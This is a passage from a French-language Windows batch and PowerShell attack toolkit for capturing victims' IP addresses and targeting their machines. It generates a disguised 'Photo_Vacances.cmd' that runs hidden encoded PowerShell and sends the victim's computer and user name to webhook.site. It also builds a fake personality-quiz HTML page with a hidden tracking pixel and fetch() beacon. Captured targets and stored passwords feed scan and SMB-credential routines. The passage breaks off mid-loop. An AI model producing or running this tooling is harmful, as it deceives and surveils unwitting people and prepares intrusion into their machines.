set "CAP_PS=%TEMP%\capbld_%RANDOM%.ps1"
set "CAP_OPTS=%TEMP%\capopts.txt"
set "CAP_IPS=%TEMP%\capips.txt"
set "IPDIST_CAP=%~dp0ip distant.txt"
if exist "%CAP_OPTS%" del /f /q "%CAP_OPTS%"
if exist "%CAP_IPS%"  del /f /q "%CAP_IPS%"
>>"%CAP_PS%" echo $f = '%IPDIST_CAP%'
>>"%CAP_PS%" echo if (-not (Test-Path $f)) { exit 1 }
>>"%CAP_PS%" echo $seen=@{}; $entries=@()
>>"%CAP_PS%" echo foreach ($l in (Get-Content $f -EA SilentlyContinue)) {
>>"%CAP_PS%" echo     if ($l -match "IP: (\S+)\s+(?:--|\|)\s+PC: (.+?)\s+(?:--|\|)\s+User: (.+?)(?:\s+--\s+Pass:\s*(.+))?$") {
>>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2].Trim(); $usr=$matches[3].Trim(); $pw=if($matches[4]){$matches[4].Trim()}else{''}
>>"%CAP_PS%" echo         if (-not $seen[$ip]) { $seen[$ip]=$true; $entries += @{IP=$ip;PC=$pc;USR=$usr;PW=$pw} }
>>"%CAP_PS%" echo         elseif ($pw -and -not $seen[$ip+'_pw']) { $seen[$ip+'_pw']=$true; for($i=0;$i -lt $entries.Count;$i++){if($entries[$i].IP -eq $ip){$entries[$i].USR=$usr;$entries[$i].PW=$pw}} }
>>"%CAP_PS%" echo     } }
>>"%CAP_PS%" echo $entries = $entries ^| Select-Object -Last 9
>>"%CAP_PS%" echo if ($entries.Count -eq 0) { exit 1 }
>>"%CAP_PS%" echo $opts = ($entries ^| ForEach-Object { $tag=if($_.PW){'[MDP] '}else{''}; $tag+$_.IP+"~PC: "+$_.PC+" / User: "+$_.USR }) -join ";"
>>"%CAP_PS%" echo $opts + ";[---];Saisir une IP ou DNS manuellement~IPv4, IPv6, DDNS, Tailscale;Retour" ^| Set-Content "%CAP_OPTS%" -Encoding ASCII
>>"%CAP_PS%" echo ($entries ^| ForEach-Object { $_.IP + ";" + $_.PC + ";" + $_.USR + ";" + $_.PW }) ^| Set-Content "%CAP_IPS%" -Encoding ASCII
powershell -NoProfile -ExecutionPolicy Bypass -File "%CAP_PS%"
set "cap_rc=%errorlevel%"
if exist "%CAP_PS%" del /f /q "%CAP_PS%"
if "%cap_rc%"=="1" goto ds_saisir_ip_manual
set "cap_opts_str="
set /p cap_opts_str=<"%CAP_OPTS%"
if exist "%CAP_OPTS%" del /f /q "%CAP_OPTS%"
if not defined cap_opts_str goto ds_saisir_ip_manual
call :DynamicMenu "CIBLES CAPTUREES - CHOISIR UNE CIBLE" "!cap_opts_str!" "NONUMS"
set "cap_sel=%errorlevel%"
if "%cap_sel%"=="0" goto cyber_ip_grabber
REM --- Retrouver l'IP par index (ligne N dans cap_ips) ---
set "remote_ip="
set "cnt=0"
set "remote_pass="
for /f "usebackq tokens=1,2,3,4 delims=;" %%a in ("%CAP_IPS%") do (
    set /a cnt+=1
    if "!cnt!"=="!cap_sel!" (
        set "remote_ip=%%a"
        set "remote_pc=%%b"
        set "remote_user=%%c"
        set "remote_pass=%%d"
    )
)
if exist "%CAP_IPS%" del /f /q "%CAP_IPS%"
if defined remote_ip (
    set "remote_port=NONE"
    if defined remote_pass if not "!remote_pass!"=="" (
        set "cred_u=!remote_user!"
        set "cred_p=!remote_pass!"
        set "smb_host=!remote_ip!"
        set "_tv6=!remote_ip::=!"
        if not "!_tv6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
        goto wan_post_creds
    )
    goto wan_public_scan
)
REM --- sel > N (Saisir manuellement ou Retour) ---
set /a n_retour=!cnt!+2
if "!cap_sel!"=="!n_retour!" goto cyber_ip_grabber
REM --- Saisie manuelle ([N] choisi ou pas de captures) ---
:ds_saisir_ip_manual
cls
echo.
echo  ================================================
echo   SAISIR L'IP OU LE NOM DNS DE LA CIBLE
echo  ================================================
echo.
echo  Exemples :
echo   - IP publique WAN  : 82.xx.xx.xx
echo   - IPv6 WAN         : 2a01:e0a:5b4:5510:...
echo   - DDNS             : cible.duckdns.org
echo   - Tailscale        : nom-pc.tailXXXX.ts.net
echo.
call :InputWithEsc "IP ou DNS de la cible : " remote_ip
if errorlevel 1 goto cyber_ip_grabber
if not defined remote_ip goto cyber_ip_grabber
REM --- Validation IP / Hostname ---
set "VALPS=%TEMP%\val_%RANDOM%.ps1"
>>  "%VALPS%" echo $in = [System.Environment]::GetEnvironmentVariable("remote_ip")
>>  "%VALPS%" echo if (-not $in) { exit 1 }
>>  "%VALPS%" echo $resolved = $null
>>  "%VALPS%" echo if ($in -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$") {
>>  "%VALPS%" echo     $parts = $in.Split(".")
>>  "%VALPS%" echo     $ok = ($parts ^| Where-Object { [int]$_ -gt 255 }).Count -eq 0
>>  "%VALPS%" echo     if ($ok) { $resolved = $in }
>>  "%VALPS%" echo } elseif ($in -match "^[0-9a-fA-F:]{3,39}$") {
>>  "%VALPS%" echo     $addr = $null; if ([System.Net.IPAddress]::TryParse($in, [ref]$addr) -and $addr.AddressFamily -eq "InterNetworkV6") { $resolved = $in }
>>  "%VALPS%" echo } else {
>>  "%VALPS%" echo     try { $a = [System.Net.Dns]::GetHostAddresses($in) ^| Where-Object { $_.AddressFamily -eq "InterNetwork" } ^| Select-Object -First 1; if ($a) { $resolved = $a.IPAddressToString } } catch {}
>>  "%VALPS%" echo }
>>  "%VALPS%" echo if (-not $resolved) { Write-Host "  [!] Adresse invalide ou introuvable (verifiez l IP ou le nom de domaine)." -ForegroundColor Red; exit 1 }
>>  "%VALPS%" echo Write-Host ("  [OK] Cible validee : " + $resolved) -ForegroundColor Green
>>  "%VALPS%" echo $resolved ^| Set-Content "$env:TEMP\val_result.txt" -Encoding ASCII
powershell -NoProfile -ExecutionPolicy Bypass -File "%VALPS%"
set "val_err=%errorlevel%"
if exist "%VALPS%" del /f /q "%VALPS%"
if "%val_err%"=="1" (
    echo.
    echo  %R%[!] Saisie invalide. Veuillez entrer une IP valide ou un nom de domaine resolvable.%N%
    timeout /t 2 >nul
    goto ds_saisir_ip_manual
)
if exist "%TEMP%\val_result.txt" (
    set /p remote_ip=<"%TEMP%\val_result.txt"
    del /f /q "%TEMP%\val_result.txt"
)
set "remote_pc="
echo.
REM --- Redirection directe vers scan de la cible ---
set "remote_port=NONE"
goto wan_public_scan

:cyber_lan_direct
set "base_ip=AUTO"
goto start_lan_scan

:gm_traps_menu
set "trap_q=PIEGE CMD - Fichier .cmd piege - la cible double-clique~Photo Vacances.cmd son IP arrive ici automatiquement;PIXEL HTML - Page web piege - la cible ouvre un lien~Envoyez par Discord ou email aucun clic suspect;PIEGE NTFY - Notif instantanee sur navigateur/mobile~La cible execute le CMD vous recevez l'IP sur ntfy.sh;Recuperer captures passees~Script ferme trop tot ? Recuperez les IP capturees en votre absence"
call :DynamicMenu "CHOISIR UN PIEGE POUR CAPTURER SON IP" "%trap_q%" "NONUMS"
set "gm_ch=%errorlevel%"
if "%gm_ch%"=="0" goto cyber_ip_grabber
if "%gm_ch%"=="1" goto gm_webhook_trap
if "%gm_ch%"=="2" goto gm_pixel_html
if "%gm_ch%"=="3" goto gm_email_trap
if "%gm_ch%"=="4" goto gm_retrieve_past
goto gm_traps_menu
if "%gm_ch%"=="5" goto gm_traps_menu
goto gm_traps_menu

:gm_webhook_trap
cls
echo.
echo  ================================================
echo   [PIEGE CMD] LIEN WEBHOOK.SITE
echo  ================================================
echo.
echo  [i] Un fichier Photo_Vacances.cmd sera cree sur votre Bureau.
echo      Envoyez-le a votre cible (Discord, email, cle USB...).
echo      Quand il double-clique, son IP arrive ici et le scan
echo      se lance automatiquement.
echo.
echo  [i] Connexion au relai webhook.site en cours...
set "PS_WH=%TEMP%\ig_wh_%RANDOM%.ps1"
>> "%PS_WH%" echo $Host.UI.RawUI.FlushInputBuffer()
>> "%PS_WH%" echo try {
>> "%PS_WH%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
>> "%PS_WH%" echo $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
>> "%PS_WH%" echo $id = $tk.uuid
>> "%PS_WH%" echo if (-not $id) { throw 'UUID vide' }
>> "%PS_WH%" echo $url = 'https://webhook.site/' + $id
>> "%PS_WH%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
>> "%PS_WH%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
>> "%PS_WH%" echo $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
>> "%PS_WH%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
>> "%PS_WH%" echo $cmd = "@echo off`r`nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`r`nexit"
>> "%PS_WH%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
>> "%PS_WH%" echo Write-Host ''
>> "%PS_WH%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd sur le Bureau' -f Green
>> "%PS_WH%" echo Write-Host '  [i] Envoyez ce fichier a votre cible et attendez...' -f Cyan
>> "%PS_WH%" echo Write-Host '  [i] En attente (ECHAP pour annuler)' -f DarkYellow
>> "%PS_WH%" echo Write-Host ''
>> "%PS_WH%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
>> "%PS_WH%" echo while (-not $esc -and -not $found) {
>> "%PS_WH%" echo   if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_WH%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_WH%" echo   }
>> "%PS_WH%" echo   try {
>> "%PS_WH%" echo     $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
>> "%PS_WH%" echo     if (@($rs.data).Count -gt 0) {
>> "%PS_WH%" echo       $found = $true
>> "%PS_WH%" echo       $d = @($rs.data)[0]
>> "%PS_WH%" echo       $ip_val = $d.ip
>> "%PS_WH%" echo       $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
>> "%PS_WH%" echo       $pc_val  = if ($segs.Count -ge 2) { $segs[-2] } else { '?' }
>> "%PS_WH%" echo       $usr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
>> "%PS_WH%" echo       Write-Host ''
>> "%PS_WH%" echo       Write-Host '  =================================================' -f Red
>> "%PS_WH%" echo       Write-Host ("  IP      : " + $ip_val) -f Cyan
>> "%PS_WH%" echo       Write-Host ("  Machine : " + $pc_val) -f White
>> "%PS_WH%" echo       Write-Host ("  Session : " + $usr_val) -f White
>> "%PS_WH%" echo       Write-Host '  =================================================' -f Red
>> "%PS_WH%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
>> "%PS_WH%" echo     }
>> "%PS_WH%" echo   } catch {}
>> "%PS_WH%" echo   if (-not $found) {
>> "%PS_WH%" echo     $i = 3
>> "%PS_WH%" echo     while ($i -gt 0) {
>> "%PS_WH%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
>> "%PS_WH%" echo       $si++; $i--; Start-Sleep -Milliseconds 1000
>> "%PS_WH%" echo       if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_WH%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_WH%" echo       }
>> "%PS_WH%" echo     }
>> "%PS_WH%" echo   }
>> "%PS_WH%" echo }
>> "%PS_WH%" echo if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
>> "%PS_WH%" echo if ($found) { Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green }
>> "%PS_WH%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_WH%"
if exist "%PS_WH%" del /f /q "%PS_WH%"
if exist "%TEMP%\captured_ip.txt" (
    set /p capture_data=<"%TEMP%\captured_ip.txt"
    for /f "tokens=1-3 delims=;" %%a in ("!capture_data!") do (
        set "remote_ip=%%a"
        set "remote_pc=%%b"
        set "remote_user=%%c"
    )
    del /f /q "%TEMP%\captured_ip.txt"
    if defined remote_ip (
        if not exist "ip distant.txt" type nul > "ip distant.txt"
        findstr /C:"IP: !remote_ip!" "ip distant.txt" >nul
        if errorlevel 1 echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !remote_user! >> "ip distant.txt"
        set "remote_port=NONE"
        echo.
        echo  [-^>] IP capturee ! Scan automatique en cours...
        timeout /t 2 >nul
        goto wan_public_scan
    )
)
goto gm_traps_menu

REM --- [3] Pixel HTML Tracker ---
:gm_pixel_html
cls
echo.
echo  ================================================
echo   [HTML] PIXEL TRACKER NAVIGATEUR
echo  ================================================
echo.
echo  [i] Genere une page HTML a envoyer a votre cible.
echo      Il lui suffit de l'ouvrir dans Chrome ou Firefox.
echo      Aucun double-clic ni execution requise.
echo      Son IP est captee des l'ouverture de la page.
echo.
echo  [i] Generation du token webhook.site...
set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
set "CAPFILE=%TEMP%\captured_ip.txt"
>> "%PS_HTML%" echo $Host.UI.RawUI.FlushInputBuffer()
>> "%PS_HTML%" echo $capFile = "%CAPFILE%"
>> "%PS_HTML%" echo try {
>> "%PS_HTML%" echo   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
>> "%PS_HTML%" echo   $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
>> "%PS_HTML%" echo   $id = $tk.uuid; if (-not $id) { throw 'UUID vide' }
>> "%PS_HTML%" echo   $url = 'https://webhook.site/' + $id
>> "%PS_HTML%" echo   $api = 'https://webhook.site/token/' + $id + '/requests'
>> "%PS_HTML%" echo   Add-Content '%~dp0webhook_tokens.txt' -Value ((Get-Date -Format 'dd/MM HH:mm') + ';' + $api) -Encoding ASCII
>> "%PS_HTML%" echo   $desk = [Environment]::GetFolderPath('Desktop') + '\Quiz_Personnalite.html'
>> "%PS_HTML%" echo   $b64 = 'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZnIiPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+PHRpdGxlPlF1ZWwgdHlwZSBkZSBwZXJzb25uZSBlcy10dSA/PC90aXRsZT48c3R5bGU+Kntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfWJvZHl7Zm9udC1mYW1pbHk6U2Vnb2UgVUksVGFob21hLHNhbnMtc2VyaWY7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCM2NjdlZWEsIzc2NGJhMik7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7cGFkZGluZzoyMHB4fS5jYXJke2JhY2tncm91bmQ6I2ZmZjtib3JkZXItcmFkaXVzOjI0cHg7cGFkZGluZzo0MHB4IDM2cHg7bWF4LXdpZHRoOjU0MHB4O3dpZHRoOjEwMCU7Ym94LXNoYWRvdzowIDI0cHggNjRweCByZ2JhKDAsMCwwLC4yKTt0ZXh0LWFsaWduOmNlbnRlcn0udG9we2ZvbnQtc2l6ZTo1MnB4O21hcmdpbi1ib3R0b206MTRweH1oMXtmb250LXNpemU6MjRweDtmb250LXdlaWdodDo4MDA7Y29sb3I6IzFhMWEyZTttYXJnaW4tYm90dG9tOjZweH0uc3Vie2NvbG9yOiM5YjliOWI7Zm9udC1zaXplOjE0cHg7bWFyZ2luLWJvdHRvbToyOHB4fS5wYmd7aGVpZ2h0OjZweDtiYWNrZ3JvdW5kOiNmMGYwZjA7Ym9yZGVyLXJhZGl1czozcHg7bWFyZ2luLWJvdHRvbTozMnB4O292ZXJmbG93OmhpZGRlbn0ucGJhcntoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCg5MGRlZywjNjY3ZWVhLCM3NjRiYTIpO2JvcmRlci1yYWRpdXM6M3B4O3RyYW5zaXRpb246d2lkdGggLjRzIGVhc2U7d2lkdGg6MCV9LnF0eHR7Zm9udC1zaXplOjE3cHg7Zm9udC13ZWlnaHQ6NjAwO2NvbG9yOiMyZDJkMmQ7bWFyZ2luLWJvdHRvbToyMHB4O2xpbmUtaGVpZ2h0OjEuNX0ub3B0c3tkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2dhcDoxMHB4O21hcmdpbi1ib3R0b206MTZweH0ub3B0e3BhZGRpbmc6MTRweCAxOHB4O2JvcmRlcjoycHggc29saWQgI2ViZWJlYjtib3JkZXItcmFkaXVzOjEycHg7Y3Vyc29yOnBvaW50ZXI7Zm9udC1zaXplOjE0cHg7dGV4dC1hbGlnbjpsZWZ0O3RyYW5zaXRpb246YWxsIC4ycztmb250LWZhbWlseTppbmhlcml0O2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMzMzO3dpZHRoOjEwMCV9Lm9wdDpob3Zlcntib3JkZXItY29sb3I6IzY2N2VlYTtiYWNrZ3JvdW5kOiNmNWYzZmY7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoNHB4KX0uY3Rye2NvbG9yOiNjMGMwYzA7Zm9udC1zaXplOjEycHh9LnJle2ZvbnQtc2l6ZTo3MnB4O21hcmdpbi1ib3R0b206MTZweH0ucnR7Zm9udC1zaXplOjI2cHg7Zm9udC13ZWlnaHQ6ODAwO2NvbG9yOiMxYTFhMmU7bWFyZ2luLWJvdHRvbToxNHB4fS5yZHtjb2xvcjojNjY2O2ZvbnQtc2l6ZToxNXB4O2xpbmUtaGVpZ2h0OjEuOH08L3N0eWxlPjwvaGVhZD48Ym9keT48aW1nIHNyYz0iVVJMUExBQ0VIT0xERVIiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHN0eWxlPSJwb3NpdGlvbjpmaXhlZDt0b3A6LTk5OTlweCI+PGRpdiBjbGFzcz0iY2FyZCIgaWQ9ImNhcmQiPjxkaXYgY2xhc3M9InRvcCI+JiN4MUY5RTA7PC9kaXY+PGgxPlF1ZWwgdHlwZSBkZSBwZXJzb25uZSBlcy10dSA/PC9oMT48cCBjbGFzcz0ic3ViIj40IHF1ZXN0aW9ucyBwb3VyIHRvdXQgc2F2b2lyPC9wPjxkaXYgY2xhc3M9InBiZyI+PGRpdiBjbGFzcz0icGJhciIgaWQ9ImJhciI+PC9kaXY+PC9kaXY+PHAgY2xhc3M9InF0eHQiIGlkPSJxIj48L3A+PGRpdiBjbGFzcz0ib3B0cyIgaWQ9Im9wdHMiPjwvZGl2PjxwIGNsYXNzPSJjdHIiIGlkPSJjdHIiPjwvcD48L2Rpdj48c2NyaXB0PnRyeXtmZXRjaCgiVVJMUExBQ0VIT0xERVIvIitlbmNvZGVVUklDb21wb25lbnQobmF2aWdhdG9yLnVzZXJBZ2VudCkrIi8iK3NjcmVlbi53aWR0aCsieCIrc2NyZWVuLmhlaWdodCl9Y2F0Y2goeCl7fXZhciBxcz1be3E6IlVuIG1lc3NhZ2UgYXJyaXZlIMOgIDJoIGR1IG1hdGluLiBUdSA6IixvOlsiUsOpcG9uZHMgZGlyZWN0IPCfkqwiLCJMaWtlIHNhbnMgcsOpcG9uZHJlIPCfkY0iLCJWb2lzIMOnYSBsZSBsZW5kZW1haW4g8J+YtCIsIk5vdGlmcyBjb3Vww6llcyDwn5SVIl19LHtxOiJMZSBkZW50aWZyaWNlIGVzdCB2aWRlLCBwZXJzb25uZSBuZSByYWPDqHRlLiBUdSA6IixvOlsiTOKAmXV0aWxpc2VzIHF1YW5kIG3Dqm1lIPCfmKQiLCJSYWPDqHRlcyBlbiBzaWxlbmNlIPCfm5IiLCLDiWNyYXNlcyBkYW5zIHRvdXMgbGVzIHNlbnMg8J+YgyIsIkVuIHBhcmxlcyDDoCB0b3V0IGxlIG1vbmRlIPCfk6MiXX0se3E6IlRhIG3DqXRob2RlIHBvdXIgbGVzIHPDqXJpZXMgOiIsbzpbIlRvdXQgZW5jaMOiw65uZXIgZW4gdW5lIG51aXQg8J+OrCIsIlBhdXNlIHRvdXRlcyBsZXMgMTAgbWluIPCfk7EiLCJUw6lsIGVuIG1haW4gcGVuZGFudCBs4oCZw6lwaXNvZGUg8J+YhSIsIlR1IHTigJllbmRvcnMgw6AgY2hhcXVlIGZvaXMg8J+SpCJdfSx7cToiUXVlbHF14oCZdW4gZGl0IG9uIGRvaXQgcGFybGVyLiBUdSA6IixvOlsiUmFwcGVsbGVzIGRpcmVjdCDwn5iwIiwiUHLDqXBhcmVzIHRhIGTDqWZlbnNlIPCfmKwiLCJBdHRlbmRzIHF14oCZaWwgcmFwcGVsbGUg8J+YkCIsIkZhaXMgc2VtYmxhbnQgZGUgcGFzIHZvaXIg8J+ZiCJdfV07dmFyIHJzPVt7ZToi8J+mpSIsdDoiTGUgU2VpZ25ldXIgZHUgQ2FsbWUiLGQ6IlR1IHByZW5kcyBsYSB2aWUgY29tbWUgZWxsZSB2aWVudC4gUmllbiBuZSB0ZSBzdHJlc3NlIHZyYWltZW50IOKAlCBvdSBkdSBtb2lucyB0dSBsZSBjYWNoZXMgYmllbi4gTGVzIGdlbnMgdOKAmWVudmllbnQgc2FucyB0ZSBsZSBkaXJlLiJ9LHtlOiLwn6aKIix0OiJMZSBSZW5hcmQgU3RyYXTDqGdlIixkOiJUdSBvYnNlcnZlcyBhdmFudCBk4oCZYWdpci4gVG91am91cnMgZGV1eCBsb25ndWV1cnMgZOKAmWF2YW5jZS4gTGVzIGF1dHJlcyBjcm9pZW50IGNvbXByZW5kcmUgdGVzIHBsYW5z4oCmIGlscyBvbnQgdG9ydC4ifSx7ZToi8J+QuiIsdDoiTGUgTG91cCBTb2NpYWJsZSIsZDoiVHUgYXBwcsOpY2llcyBsZXMgZ2VucyBtYWlzIHR1IGFzIGJlc29pbiBkZSB0b24gZXNwYWNlLiBUdSBjaG9pc2lzIHRlcyBiYXRhaWxsZXMgZXQgdG9uIMOpbmVyZ2llLiBSYXJlIGV0IHByw6ljaWV1eC4ifSx7ZToi8J+mgSIsdDoiTGUgTGlvbiBkZSBDYW5hcMOpIixkOiJQdWlzc2FudCBxdWFuZCB0dSBsZSBkw6ljaWRlcyB2cmFpbWVudC4gTGEgc2llc3RlIGVzdCB0b24gc3VwZXItcG91dm9pciBldCBwZXJzb25uZSBuZSBwZXV0IHRlIGp1Z2VyIHBvdXIgw6dhLiJ9XTt2YXIgc3RlcD0wLHNjb3JlPTA7ZnVuY3Rpb24gcmVuZGVyKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJhciIpLnN0eWxlLndpZHRoPShzdGVwKjI1KSsiJSI7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInEiKS50ZXh0Q29udGVudD1xc1tzdGVwXS5xO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjdHIiKS50ZXh0Q29udGVudD0iUXVlc3Rpb24gIisoc3RlcCsxKSsiIC8gNCI7dmFyIG89ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm9wdHMiKTtvLmlubmVySFRNTD0iIjtmb3IodmFyIGk9MDtpPDQ7aSsrKXsoZnVuY3Rpb24obil7dmFyIGI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7Yi5jbGFzc05hbWU9Im9wdCI7Yi50ZXh0Q29udGVudD1xc1tzdGVwXS5vW25dO2Iub25jbGljaz1mdW5jdGlvbigpe3Njb3JlKz1uO3N0ZXArKztzdGVwPDQ/cmVuZGVyKCk6cmVzdWx0KCk7fTtvLmFwcGVuZENoaWxkKGIpO30pKGkpO319ZnVuY3Rpb24gcmVzdWx0KCl7dmFyIHI9cnNbTWF0aC5taW4oTWF0aC5yb3VuZChzY29yZS80KSwzKV07dmFyIGM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNhcmQiKTtjLmlubmVySFRNTD0iIjt2YXIgZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtlLmNsYXNzTmFtZT0icmUiO2UudGV4dENvbnRlbnQ9ci5lO2MuYXBwZW5kQ2hpbGQoZSk7dmFyIHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7dC5jbGFzc05hbWU9InJ0Ijt0LnRleHRDb250ZW50PXIudDtjLmFwcGVuZENoaWxkKHQpO3ZhciBkPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2QuY2xhc3NOYW1lPSJyZCI7ZC50ZXh0Q29udGVudD1yLmQ7Yy5hcHBlbmRDaGlsZChkKTt9cmVuZGVyKCk7PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4='
>> "%PS_HTML%" echo   $html = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) -replace 'URLPLACEHOLDER',$url
>> "%PS_HTML%" echo   $enc = New-Object System.Text.UTF8Encoding($false)
>> "%PS_HTML%" echo   [System.IO.File]::WriteAllText($desk, $html, $enc)
>> "%PS_HTML%" echo   Write-Host '  [OK] Page HTML generee : Quiz_Personnalite.html' -f Green
>> "%PS_HTML%" echo   Write-Host '  [i] Envoyez Quiz_Personnalite.html a votre cible (Discord, email, WhatsApp...)' -f Cyan
>> "%PS_HTML%" echo   Write-Host '  [i] L''IP est captee des l''ouverture, avant meme qu''il reponde' -f Cyan
>> "%PS_HTML%" echo   Write-Host '  [i] En attente... (ECHAP pour annuler)' -f DarkYellow
>> "%PS_HTML%" echo   Write-Host ''
>> "%PS_HTML%" echo   $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
>> "%PS_HTML%" echo   while (-not $esc -and -not $found) {
>> "%PS_HTML%" echo     if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_HTML%" echo       if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_HTML%" echo     }
>> "%PS_HTML%" echo     try {
>> "%PS_HTML%" echo       $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
>> "%PS_HTML%" echo       if (@($rs.data).Count -gt 0) {
>> "%PS_HTML%" echo         $found = $true; $d = @($rs.data)[0]; $ip_val = $d.ip
>> "%PS_HTML%" echo         $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
>> "%PS_HTML%" echo         $ua_raw = if ($segs.Count -ge 2) { [uri]::UnescapeDataString($segs[-2]) } else { '?' }
>> "%PS_HTML%" echo         $scr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
>> "%PS_HTML%" echo         $browser = if ($ua_raw -match 'Edg/') { 'Edge' } elseif ($ua_raw -match 'Chrome/') { 'Chrome' } elseif ($ua_raw -match 'Firefox/') { 'Firefox' } elseif ($ua_raw -match 'Safari/') { 'Safari' } else { 'Browser' }
>> "%PS_HTML%" echo         $os = if ($ua_raw -match 'Windows NT 1[01]') { 'Win10-11' } elseif ($ua_raw -match 'Windows') { 'Windows' } elseif ($ua_raw -match 'Mac') { 'macOS' } elseif ($ua_raw -match 'Linux') { 'Linux' } elseif ($ua_raw -match 'Android') { 'Android' } elseif ($ua_raw -match 'iPhone^|iPad') { 'iOS' } else { 'OS?' }
>> "%PS_HTML%" echo         $pc_val = $os + '-' + $browser + ' (' + $scr_val + ')'
>> "%PS_HTML%" echo         Write-Host ''
>> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
>> "%PS_HTML%" echo         Write-Host ("  IP         : " + $ip_val) -f Cyan
>> "%PS_HTML%" echo         Write-Host ("  OS/Browser : " + $pc_val) -f White
>> "%PS_HTML%" echo         Write-Host ("  Ecran      : " + $scr_val) -f White
>> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
>> "%PS_HTML%" echo         $ipdist = '%~dp0ip distant.txt'
>> "%PS_HTML%" echo         if (-not (Test-Path $ipdist)) { $null = New-Item $ipdist -ItemType File -Force }
>> "%PS_HTML%" echo         if (-not (Select-String -Path $ipdist -Pattern ([regex]::Escape($ip_val)) -Quiet -EA SilentlyContinue)) {
>> "%PS_HTML%" echo           $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm') + '] IP: ' + $ip_val + ' -- PC: ' + $pc_val + ' -- User: inconnu'
>> "%PS_HTML%" echo           Add-Content $ipdist -Value $entry -Encoding UTF8
>> "%PS_HTML%" echo           Write-Host '  [+] Sauvegarde dans ip distant.txt' -f Green
>> "%PS_HTML%" echo         }
>> "%PS_HTML%" echo       }
>> "%PS_HTML%" echo     } catch {}
>> "%PS_HTML%" echo     if (-not $found) {
>> "%PS_HTML%" echo       $i = 3
>> "%PS_HTML%" echo       while ($i -gt 0) {
>> "%PS_HTML%" echo         [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
>> "%PS_HTML%" echo         $si++; $i--; Start-Sleep -Milliseconds 1000
